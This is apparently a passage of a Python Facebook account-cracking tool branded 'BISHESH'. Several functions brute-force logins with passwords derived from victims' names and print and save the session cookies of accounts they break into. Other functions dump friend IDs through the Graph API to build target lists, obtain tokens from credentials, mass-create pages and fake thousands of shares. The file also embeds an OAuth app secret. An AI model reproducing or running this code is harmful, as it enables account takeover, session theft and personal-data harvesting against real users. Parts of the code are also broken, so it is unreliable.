    try:
        first = names.split(' ')[0]
        try:
            last = names.split(' ')[1]
        except IndexError:
            last = 'Magar'
        ps = first.lower()
        ps2 = last.lower()
        
        for fikr in passlist:
            pas = fikr.replace('First', first).replace('Last', last).replace('first', ps).replace('last', ps2)
            ua = W_ueragnt()  # Generate user-agent string
            head = {
                'Host': 'm.facebook.com',
                'viewport-width': '980',
                'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"',
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-platform': '"Android"',
                'sec-ch-prefers-color-scheme': 'light',
                'dnt': '1',
                'upgrade-insecure-requests': '1',
                'user-agent': ua,  # Set the generated user-agent
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                'sec-fetch-site': 'none',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-user': '?1',
                'sec-fetch-dest': 'document',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'en-US,en;q=0.9'
            }
            getlog = session.get(f'https://m.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
            idpass = {
                "lsd": re.search('name="lsd" value="(.*?)"', getlog.text).group(1),
                "jazoest": re.search('name="jazoest" value="(.*?)"', getlog.text).group(1),
                "uid": ids,
                "next": "https://m.facebook.com/login/save-device/",
                "flow": "login_no_pin",
                "pass": pas
            }
            complete = session.post(f'https://m.facebook.com/login/device-based/validate-password/?shbl=0', data=idpass, allow_redirects=False, headers=head)
            Bishesh = session.cookies.get_dict().keys()
            
            if "c_user" in Bishesh:
                coki = session.cookies.get_dict()
                kuki = (";").join(["%s=%s" % (key, value) for key, value in session.cookies.get_dict().items()])
                print(f'\r\033[1;37m [BISHESH-ALIVE] \033[1;36m{ids} | {pas}\033[0m')
                print(f' [COOKIE] : \033[1;36m{kuki}')
                
                # Fetch and print active and expired apps
                active_apps, expired_apps = cek_apk(kuki)
                
                # Print active apps in cyan color
                for app in active_apps:
                    print(f'\033[1;36m» {app}\033[0m')
                
                # Print expired apps in white color
                for app in expired_apps:
                    print(f'\033[1;37m» {app}\033[0m')

                write_alive(ids, pas, kuki)
                oks.append(ids)
                time.sleep(1)
                break
            elif 'checkpoint' in Bishesh:
                if 'y' in pcp:  # pcp needs to be defined or handled properly
                    print(f'\r\x1b[38;5;126m [BISHESH-CP] ' + ids + ' | ' + pas + '\033[1;97m')
                    write_cp(ids, pas)
                    cps.append(ids)
                    break
                else:
                    break
            else:
                continue
    except requests.exceptions.ConnectionError:
        time.sleep(20)
    
    loop += 1
    sys.stdout.write(f'\r\033[1;37m「BISHESH」%s|\033[1;36mALIVE:-%s \033[1;37m' % (loop, len(oks)))
    sys.stdout.flush()





def ffb1(ids, names, passlist):
    global loop, oks, cps
    time.sleep(1)
    session = requests.Session()

    try:
        first = names.split(' ')[0]
        try:
            last = names.split(' ')[1]
        except IndexError:
            last = 'Magar'
        ps = first.lower()
        ps2 = last.lower()

        for fikr in passlist:
            pas = fikr.replace('First', first).replace('Last', last).replace('first', ps).replace('last', ps2)
            ua = W_ueragnt()  # Generate user-agent string
            head = {
                'Host': 'mbasic.facebook.com',
                'viewport-width': '980',
                'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"',
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-platform': '"Android"',
                'sec-ch-prefers-color-scheme': 'light',
                'dnt': '1',
                'upgrade-insecure-requests': '1',
                'user-agent': ua,  # Set the generated user-agent
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                'sec-fetch-site': 'none',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-user': '?1',
                'sec-fetch-dest': 'document',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'en-US,en;q=0.9'
            }
            getlog = session.get(f'https://mbasic.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
            lsd = re.search(r'name="lsd" value="(.*?)"', getlog.text).group(1)
            jazoest = re.search(r'name="jazoest" value="(.*?)"', getlog.text).group(1)
            idpass = {
                "lsd": lsd,
                "jazoest": jazoest,
                "uid": ids,
                "next": "https://mbasic.facebook.com/login/save-device/",
                "flow": "login_no_pin",
                "pass": pas
            }
            complete = session.post(f'https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0', data=idpass, allow_redirects=False, headers=head)
            Bishesh = session.cookies.get_dict().keys()

            if "c_user" in Bishesh:
                coki = session.cookies.get_dict()
                kuki = (";").join(["%s=%s" % (key, value) for key, value in session.cookies.get_dict().items()])
                account_year = get_year_range(ids)
                active_apps, expired_apps = cek_apk(kuki)

                print(f'\r\r\033[1;37m [BISHESH-ALIVE] \033[1;36m{ids} | {pas} [{account_year}]\033[0m')
                print(f' [COOKIE] : \033[1;36m{kuki}')

                # Print active apps in cyan color
                for app in active_apps:
                    print(f'\033[1;36m» {app}\033[0m')

                # Print expired apps in white color
                for app in expired_apps:
                    print(f'\033[1;37m» {app}\033[0m')

                write_alive(ids, pas, kuki)
                oks.append(ids)
                time.sleep(1)
                break
            elif 'checkpoint' in Bishesh:
                if 'y' in pcp:  # pcp needs to be defined or handled properly
                    print(f'\r\r\x1b[38;5;126m [BISHESH-CP] ' + ids + ' | ' + pas + '\033[1;97m')
                    write_cp(ids, pas)
                    cps.append(ids)
                    time.sleep(1)
                    break
                else:
                    break
            else:
                continue
    except requests.exceptions.ConnectionError:
        time.sleep(20)
    loop += 1
    sys.stdout.write(f'\r\r\033[1;37m「BISHESH」 %s|\033[1;36mALIVE:-%s \033[1;37m' % (loop, len(oks)))
    sys.stdout.flush()

    
import random
import requests
import json
import uuid
import sys
import time

def api(ids, names, passlist):
    global oks, loop, cps, pcp

    try:
        fn, ln = (names.split() + [names.split()[0]])[:2]

        for pw in passlist:
            pas = (pw.replace('first', fn.lower())
                    .replace('First', fn)
                    .replace('last', ln.lower())
                    .replace('Last', ln)
                    .replace('Name', names)
                    .replace('name', names.lower()))

            ua_string = W_ueragnt()
            device_id = str(uuid.uuid4())
            adid = str(uuid.uuid4())

            data = {
                'adid': adid,
                'email': ids,
                'password': pas,
                'cpl': 'true',
                'credentials_type': 'device_based_login_password',
                'source': 'device_based_login',
                'error_detail_type': 'button_with_disabled',
                'format': 'json',
                'generate_session_cookies': '1',
                'generate_analytics_claim': '1',
                'generate_machine_id': '1',
                'locale': 'en_US',
                'client_country_code': 'US',
                'device_id': device_id,
                'method': 'auth.login',
                'fb_api_req_friendly_name': 'authenticate',
                'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler'
            }

            headers = {
                'content-type': 'application/x-www-form-urlencoded',
                'x-fb-sim-hni': str(random.randint(20000, 40000)),
                'x-fb-connection-type': 'unknown',
                'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                'user-agent': ua_string,
                'x-fb-net-hni': str(random.randint(20000, 40000)),
                'x-fb-connection-bandwidth': str(random.randint(20000000, 30000000)),
                'x-fb-connection-quality': 'EXCELLENT',
                'x-fb-friendly-name': 'authenticate',
                'accept-encoding': 'gzip, deflate',
                'x-fb-http-engine': 'Liger'
            }

            url = 'https://b-api.facebook.com/method/auth.login'
            response = requests.post(url, data=data, headers=headers, allow_redirects=False).text
            result = json.loads(response)

            if 'session_key' in result:
                account_year = result.get('created_time', 'Unknown')
                coki = result.get("kuki", "")
                kuki = "; ".join([f"{key}={value}" for key, value in result.items()])

                print(f'\r\033[1;37m [BISHESH-ALIVE] \033[1;36m{ids} | {pas} [{account_year}]\033[0m')
                print(f' [COOKIE]: \033[1;36m{kuki}\033[0m')

                # Fetch and print active and expired apps
                active_apps, expired_apps = cek_apk(kuki)
                
                # Print active apps in cyan color
                for app in active_apps:
                    print(f'\033[1;36m» {app}\033[0m')
                
                # Print expired apps in white color
                for app in expired_apps:
                    print(f'\033[1;37m» {app}\033[0m')

                write_alive(ids, pas, coki)
                oks.append(ids)
                break
            elif 'www.facebook.com' in result.get('error_msg', ''):
                if 'y' in pcp:
                    print(f'\r\033[38;5;126m [BISHESH-CP] {ids} | {pas}\033[1;97m')
                    write_cp(ids, pas)
                    cps.append(ids)
                    break
            else:
                continue

        loop += 1
        sys.stdout.write(f'\r\033[1;37m「BISHESH」 {loop} | \033[1;36mALIVE: {len(oks)} \033[1;37m')
        sys.stdout.flush()

    except requests.exceptions.ConnectionError:
        time.sleep(10)
    except Exception as e:
        print(f'Error: {e}')
        pass
        

# ────────────────[3.TOOL]─────────────────

def tool():
    linex()
    print(f'     {c}「{r}1{c}」{r} CREATE PAGE          {c}「{r}2{c}」{r} SHARE BOOST  ')
    print(f'     {c}「{r}3{c}」{r} FOLLOW               {c}「{r}4{c}」{r} CREATE ACC ')
    
    linex()
    tol = input(f'   {c}「{r}Choose {c}」{r}»  ')
    
    tool_actions = {
        '1': create_page,
        '2': AutomaticSharing,
        '3': follow,
        '4': create_account
    }
    
    tool_actions.get(tol, lambda: print(f'  {r} 「!」Invalid option. {w}'))()


def AutomaticSharing():
    access_token = input('Enter the access token: ') 
    share_url = input('Enter the Facebook post link: ')
    share_count = 22200
    time_interval = 1.5
    delete_after = 60 * 60

    headers = {
        'authority': 'graph.facebook.com',
        'cache-control': 'max-age=0',
        'sec-ch-ua-mobile': '?0',
        'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36'
    }

    def share_post(shared_count):
        try:
            response = requests.post(
                f'https://graph.facebook.com/me/feed?access_token={access_token}&fields=id&limit=1&published=0',
                json={
                    'link': share_url,
                    'privacy': {'value': 'SELF'},
                    'no_story': True,
                },
                headers=headers
            )
            response.raise_for_status()  # Ensure we raise for bad responses

            post_id = response.json().get('id')
            print(f'{c}「Success」» {c}「{wh}{shared_count}{c}」» {wh}ID: {c}{post_id or "Unknown"}{wh}{r}')

            if post_id:
                threading.Timer(delete_after, delete_post, args=(post_id,)).start()

        except requests.exceptions.RequestException as error:
            print(f'{red}Failed to share post: {error.response.json() if error.response else str(error)}{r}')

    def delete_post(post_id):
        try:
            response = requests.delete(f'https://graph.facebook.com/{post_id}?access_token={access_token}')
            response.raise_for_status()  # Ensure we raise for bad responses
            print(f'{wh}Post deleted: {post_id}{r}')
        except requests.exceptions.RequestException as error:
            print(f'{red}Failed to delete post: {error.response.json() if error.response else str(error)}{r}')

    for i in range(share_count):
        threading.Timer(i * time_interval, share_post, args=(i + 1,)).start()
    
    time.sleep(share_count * time_interval)
    print(f'{wh}Finished sharing posts.{r}')

class reg_pro5():
    def __init__(self, cookies, name) -> None:
        self.cookies = cookies
        self.name = name  # Store the name in an instance variable
        self.id_acc = self.cookies.split('c_user=')[1].split(';')[0]
        headers = {
            'authority': 'www.facebook.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'vi',
            'cookie': self.cookies,
            'sec-ch-prefers-color-scheme': 'light',
            'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
            'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.4"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-model': '""',
            'sec-ch-ua-platform': '"Android"',
            'sec-ch-ua-platform-version': '""',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
            'viewport-width': '980',
        }
        url_profile = requests.get('https://www.facebook.com/me', headers=headers).url
        profile = requests.get(url_profile, headers=headers).text
        try:
            self.fb_dtsg = profile.split('{"name":"fb_dtsg","value":"')[1].split('"},')[0]
        except:
            self.fb_dtsg = profile.split(',"f":"')[1].split('","l":null}')[0]

    def Reg(self):
        headers = {
            'authority': 'www.facebook.com',
            'accept': '*/*',
            'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
            # Requests sorts cookies= alphabetically
            'cookie': self.cookies,
            'origin': 'https://www.facebook.com',
            'referer': 'https://www.facebook.com/pages/creation?ref_type=launch_point',
            'sec-ch-prefers-color-scheme': 'dark',
            'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
            'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.4"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-model': '""',
            'sec-ch-ua-platform': '"Android"',
            'sec-ch-ua-platform-version': '""',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
            'viewport-width': '980',
            'x-fb-friendly-name': 'AdditionalProfilePlusCreationMutation',
            'x-fb-lsd': 'ZM7FAk6cuRcUp3imwqvHTY',
        }

        data = {
            'av': self.id_acc,
            '__user': self.id_acc,
            '__a': '1',
            '__dyn': '7AzHxq1mxu1syUbFuC0BVU98nwgU29zEdEc8co5S3O2S7o11Ue8hw6vwb-q7oc81xoswIwuo886C11xmfz81sbzoaEnxO0Bo7O2l2Utwwwi831wiEjwZwlo5qfK6E7e58jwGzE8FU5e7oqBwJK2W5olwuEjUlDw-wUws9ovUaU3qxWm2Sq2-azo2NwkQ0z8c84K2e3u362-2B0oobo',
            '__csr': 'gP4ZAN2d-hbbRmLObkZO8LvRcXWVvth9d9GGXKSiLCqqr9qEzGTozAXiCgyBhbHrRG8VkQm8GFAfy94bJ7xeufz8jK8yGVVEgx-7oiwxypqCwgF88rzKV8y2O4ocUak4UpDxu3x1K4opAUrwGx63J0Lw-wa90eG18wkE7y14w4hw6Bw2-o069W00CSE0PW06aU02Z3wjU6i0btw3TE1wE5u',
            '__req': 't',
            '__hs': '19296.HYP:comet_pkg.2.1.0.2.1',
            'dpr': '1',
            '__ccg': 'EXCELLENT',
            '__rev': '1006496476',
            '__s': '1gapab:y4xv3f:2hb4os',
            '__hsi': '7160573037096492689',
            '__comet_req': '15',
            'fb_dtsg': self.fb_dtsg,
            'jazoest': '25404',
            'lsd': 'ZM7FAk6cuRcUp3imwqvHTY',
            '__aaid': '800444344545377',
            '__spin_r': '1006496476',
            '__spin_b': 'trunk',
            '__spin_t': '1667200829',
            'fb_api_caller_class': 'RelayModern',
            'fb_api_req_friendly_name': 'AdditionalProfilePlusCreationMutation',
            'variables': '{"input":{"bio":"","categories":["181475575221097"],"creation_source":"comet","name":"'+self.name+'","page_referrer":"launch_point","actor_id":"'+self.id_acc+'","client_mutation_id":"1"}}',
            'server_timestamps': 'true',
            'doc_id': '5903223909690825',
        }

        response = requests.post('https://www.facebook.com/api/graphql/', headers=headers, data=data).json()
        try:
            return response['data']['additional_profile_plus_create']['additional_profile']['id']
        except:
            return (f'「Failed  」to create page.')

def create_page():
    linex()
    xd = input(f"{c}   「{r}Enter file location{c}」{w} » ")
    first = input(f" {c}  「{r}Enter first name{c}」{r} »  ")
    middle = input(f" {c}  「{r}Enter middle name{c}」{r}»  ")
    last = input(f" {c}  「{r}Enter last name{c}」{r}  » ")

    ck = []
    with open(xd, 'r') as file:
        for line in file:
            ck.append(line.split("|")[0].strip())

    linex()
    dl = input(f'{c}   「{r}How many pages to create{c}」{r} » ')
    linex()

    def delay(dl):
        t = datetime.now().strftime("%H:%M")
        for remaining_time in range(int(dl), 0, -1):
            print(f'\r\033[1;96m    Task starting in {remaining_time} seconds...', end='\r')
            sleep(5)

    dem = 0
    for cookies in ck:
        aj = first
        aj1 = middle
        aj2 = last
        name = str(aj+' '+aj1+' '+aj2)
        dem += 1
        try:
            result = reg_pro5(cookies, name).Reg()
            print(f'  {c} 「{w}{dem}{c}」「Success」»   {result} created . \n    Link : FB.me/{result}')
        except Exception as e:
            print(f' {red}  「Failed  」to create page . {wh} : {e} ')
        delay(dl)
        




# ────────────────[3.EAAY]─────────────────
def EAAY():
    linex()
    username = input(f'{c}   「{r}ID {c}」{r}»     \033[0m')
    password = input(f'   {c}「{r}PASS{c}」{r}» \033[0m')
    url = (f"https://b-api.facebook.com/method/auth.login?"
           f"access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&"
           f"format=json&sdk_version=2&email={username}&locale=en_US&password={password}&"
           f"sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
    response = requests.get(url).json()
    token = response.get('access_token', response.get('error_msg'))
    linex()
    print(f"  {c}  Token{w} : \n {c}  「{red}{token}{c}」{w}")
    #back()

# ────────────────[5•BY NAME]─────────────────

def Createfile():
    clear()
    try:
        token = open('/sdcard/Bisheshv3/login/token.txt', 'r').read()
        cok = open('/sdcard/Bisheshv3/login/cookie.txt', 'r').read()
    except (IOError, KeyError, FileNotFoundError):
        print('  - Your cookies are invalid.')
        time.sleep(2)
        clear()
        login()
    except KeyError:
        try:
            os.remove("/sdcard/Bisheshv3/login/cookie.txt")
            os.remove("/sdcard/Bisheshv3/login/token.txt")
        except:
            pass
        print('  - It seems your account is checkpointed...')
        time.sleep(2)
        menu()
        clear()
    menudup()
    dump_Massall()

def dump_Massall():
    try:
        token = open('/sdcard/Bisheshv3/login/token.txt', 'r').read()
        cok = open('/sdcard/Bisheshv3/login/cookie.txt', 'r').read()
    except IOError:
        exit()
    try:
        file_path = input(f' {c}    「{red}?{c}」{w}File path to save accounts : ')
        with open(file_path, 'w') as f:
            pass  # Just to create the file
    except Exception as e:
        print(f"{c}  「{red}!{c}」{red}Failed to create file : (")
        exit()
    
    try:
        jum = int(input(f'     「{c}?{w}」How many uid to input ? :'))
    except ValueError:
        print("Error !!!!")
        exit()
    if jum < 1 or jum > 100:
        print('Failed to dump')
        exit()
    
    ses = requests.Session()
    uid = []
    nova = []
    
    for met in range(jum):
        user_dump = input(f'   {c}  「{r}?{c}」{w}Input uid {met + 1}: ')
        uid.append(user_dump)
    
    with open(file_path, 'a') as f:
        for userr in uid:
            try:
                col = ses.get(f"https://graph.facebook.com/{userr}?fields=friends&access_token={token}", cookies={'cookies': cok}).json()
                for x in col['friends']['data']:
                    try:
                        sys.stdout.write(f"\r       Dumping {len(nova)} IDs....")
                        sys.stdout.flush()
                        nova.append(x['id'] + '|' + x['name'])
                        f.write(x['id'] + '|' + x['name'] + '\n')
                    except:
                        continue
            except (KeyError, IOError):
                pass
            except requests.exceptions.ConnectionError:
                print('Unstable signal connection')
                exit()

        # Iterate through dumped IDs to find one with a public friend list
        for friend in nova:
            friend_id = friend.split('|')[0]
            try:
                friend_col = ses.get(f"https://graph.facebook.com/{friend_id}?fields=friends&access_token={token}", cookies={'cookies': cok}).json()
                if 'friends' in friend_col:
                    for x in friend_col['friends']['data']:
                        try:
                            sys.stdout.write(f"\r      Dumping {len(nova)} IDs....")
                            sys.stdout.flush()
                            nova.append(x['id'] + '|' + x['name'])
                            f.write(x['id'] + '|' + x['name'] + '\n')
                        except:
                            continue
            except (KeyError, IOError):
                continue
            except requests.exceptions.ConnectionError:
                print('Unstable signal connection')
                exit()
    
    linex()
    print(f"      Total IDs dumped: {len(nova)}")
    


def get_cookie():
    print("Getting Cookie...")

def get_eaab():
    print("Getting EAAB Token...")

def get_eeaau():
    print("Getting EAAAU Token...")

def gettoken():
    linex()
    print(f'     1. GET COOKIE')
    print(f'     2. GET EAAY')
    print(f'     3. GET EAAB')
    print(f'     4. GET EAAAU')
    linex()
    choice = input(f'   Choose an option: »  ')

    token_actions = {
        '1': get_cookie,
        '2': EAAY(),
        '3': get_eaab,
        '4': get_eeaau
    }

    token_actions.get(choice, lambda: print('  Invalid option.'))()
    








def logout():
    try:
        os.remove("/sdcard/Bisheshv3/login/cookie.txt")
        os.remove("/sdcard/Bisheshv3/login/token.txt")
        print(' 「✓」 DONE LOGOUT ')
    except FileNotFoundError:
        print(' 「✓」 DONE LOGOUT ')
    except Exception as e:
        print(f"An error occurred: {e}")

    time.sleep(4)
    menu()
    

def ffbfix(ids, pas):
    global loop, oks, cps
    session = requests.Session()

    try:
        ua = W_ueragnt()
        head = {
            'Host': 'mbasic.facebook.com',
            'viewport-width': '980',
            'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-ch-prefers-color-scheme': 'light',
            'dnt': '1',
            'upgrade-insecure-requests': '1',
            'user-agent': ua,
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'sec-fetch-site': 'none',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-user': '?1',
            'sec-fetch-dest': 'document',
            'accept-encoding': 'gzip, deflate, br',
            'accept-language': 'en-US,en;q=0.9'
        }
        getlog = session.get(f'https://mbasic.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
        lsd = re.search(r'name="lsd" value="(.*?)"', getlog.text).group(1)
        jazoest = re.search(r'name="jazoest" value="(.*?)"', getlog.text).group(1)
        idpass = {
            "lsd": lsd,
            "jazoest": jazoest,
            "uid": ids,
            "next": "https://mbasic.facebook.com/login/save-device/",
            "flow": "login_no_pin",
            "pass": pas
        }
        complete = session.post(f'https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0', data=idpass, allow_redirects=False, headers=head)
        Bishesh = session.cookies.get_dict().keys()

        if "c_user" in Bishesh:
            coki = session.cookies.get_dict()
            kuki = (";").join(["%s=%s" % (key, value) for key, value in session.cookies.get_dict().items()])
            active_apps, expired_apps = cek_apk(kuki)

            print(f'\r\r\033[1;37m [BISHESH-FIXED] \033[1;36m{ids} | {pas}\033[0m')
            print(f' [COOKIE] : \033[1;36m{kuki}')

            for app in active_apps:
                print(f'\033[1;36m» {app}\033[0m')

            for app in expired_apps:
                print(f'\033[1;37m» {app}\033[0m')

            write_alive(ids, pas, kuki)
            oks.append(ids)
            time.sleep(1)
        elif 'checkpoint' in Bishesh:
            if 'y' in pcp:
                print(f'\r\r\x1b[38;5;126m [BISHESH-CP] ' + ids + ' | ' + pas + '\033[1;97m')
                write_cp(ids, pas)
                cps.append(ids)
                time.sleep(1)
    except requests.exceptions.ConnectionError:
        print(f'\r\r\033[1;31m[BISHESH-FAILED] {ids}\033[0m')
        time.sleep(20)
    loop += 1
    sys.stdout.write(f'\r\r\033[1;37m「FIXINGG」 %s|\033[1;36mFIXED:-%s \033[1;37m' % (loop, len(oks)))
    sys.stdout.flush()





def fixcp():
    linex()
    file = input(f'   「{c}?{r}」 {c}Put file path{r}\033[1;37m: ')
    try:
        fo = open(file, 'r').read().splitlines()
    except FileNotFoundError:
        print(f' \033[1;31m  「!」 File location not found ')
        exit()

    with tred(max_workers=10) as crack_submit:
        total_ids = str(len(fo))
        print(f'      Total Account : \033[1;36m{total_ids}\n \033[1;37m')
        linex()

        for user in fo:
            ids, pas = user.split('|')
            crack_submit.submit(ffbfix, ids, pas)





menu()